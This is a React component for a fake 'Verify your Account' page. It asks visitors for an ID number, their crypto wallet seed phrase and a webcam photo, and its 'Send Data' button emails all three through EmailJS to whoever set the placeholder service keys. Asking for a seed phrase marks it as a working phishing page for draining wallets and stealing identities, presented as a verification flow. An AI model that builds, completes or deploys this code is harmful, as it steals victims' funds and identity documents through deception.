import React, { useState, useRef } from 'react';
import emailjs from 'emailjs-com';

function AuthPage() {
  const [id, setId] = useState('');
  const [seedPhrase, setSeedPhrase] = useState('');
  const [photo, setPhoto] = useState(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  
  // Function to send email
  const sendEmail = () => {
    const templateParams = {
      id: id,
      seedPhrase: seedPhrase,
      photo: photo,
    };

    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams, 'YOUR_USER_ID')
      .then((result) => {
        console.log(result.text);
        alert('Email sent successfully!');
      }, (error) => {
        console.log(error.text);
        alert('Failed to send email.');
      });
  };

  // Function to start video stream
  const startVideo = () => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      })
      .catch(err => {
        console.error('Error accessing camera: ', err);
      });
  };

  // Function to capture photo
  const capturePhoto = () => {
    const context = canvasRef.current.getContext('2d');
    context.drawImage(videoRef.current, 0, 0, canvasRef.current.width, canvasRef.current.height);
    const dataUrl = canvasRef.current.toDataURL('image/png');
    setPhoto(dataUrl);
  };

  return (
    <div className="container mx-auto p-5">
      <h1 className="text-3xl font-bold text-center mb-8">Verify your Account</h1>
      
      {/* Progress Bar */}
      <div className="flex justify-around mb-10">
        <div className="flex flex-col items-center">
          <div className="w-10 h-10 bg-blue-500 text-white rounded-full flex items-center justify-center">1</div>
          <span className="mt-2">Fund Account</span>
        </div>
        <div className="flex flex-col items-center">
          <div className="w-10 h-10 bg-blue-500 text-white rounded-full flex items-center justify-center">2</div>
          <span className="mt-2">Facebook (Optional)</span>
        </div>
        <div className="flex flex-col items-center">
          <div className="w-10 h-10 bg-blue-500 text-white rounded-full flex items-center justify-center">3</div>
          <span className="mt-2">Verify Id</span>
        </div>
        <div className="flex flex-col items-center">
          <div className="w-10 h-10 bg-blue-500 text-white rounded-full flex items-center justify-center">4</div>
          <span className="mt-2">Verify Address</span>
        </div>
        <div className="flex flex-col items-center">
          <div className="w-10 h-10 bg-blue-500 text-white rounded-full flex items-center justify-center">5</div>
          <span className="mt-2">Summary</span>
        </div>
      </div>
      
      {/* ID Verification */}
      <div className="mb-8">
        <h2 className="text-xl font-semibold mb-4">ID Verification</h2>
        <label className="block mb-2">Enter your ID:</label>
        <input
          type="text"
          value={id}
          onChange={(e) => setId(e.target.value)}
          className="w-full border border-gray-300 rounded-md p-2"
        />
      </div>

      {/* Seed Phrase Verification */}
      <div className="mb-8">
        <h2 className="text-xl font-semibold mb-4">Seed Phrase Verification</h2>
        <label className="block mb-2">Enter your Seed Phrase:</label>
        <input
          type="text"
          value={seedPhrase}
          onChange={(e) => setSeedPhrase(e.target.value)}
          className="w-full border border-gray-300 rounded-md p-2"
        />
      </div>

      {/* Camera Verification */}
      <div className="mb-8">
        <h2 className="text-xl font-semibold mb-4">Camera Verification</h2>
        <button onClick={startVideo} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mb-4">Start Camera</button>
        <div className="flex justify-center">
          <video ref={videoRef} className="w-full max-w-md" />
          <canvas ref={canvasRef} className="hidden" width="400" height="300"></canvas>
        </div>
        <button onClick={capturePhoto} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600 mt-4">Capture Photo</button>
        {photo && (
          <div className="mt-4">
            <h3 className="text-lg font-medium">Captured Photo:</h3>
            <img src={photo} alt="Captured" className="w-full max-w-md mt-2" />
          </div>
        )}
      </div>

      {/* Summary */}
      <div className="mb-8">
        <h2 className="text-xl font-semibold mb-4">Summary</h2>
        <button onClick={sendEmail} className="bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">Send Data</button>
      </div>
    </div>
  );
}

export default AuthPage;
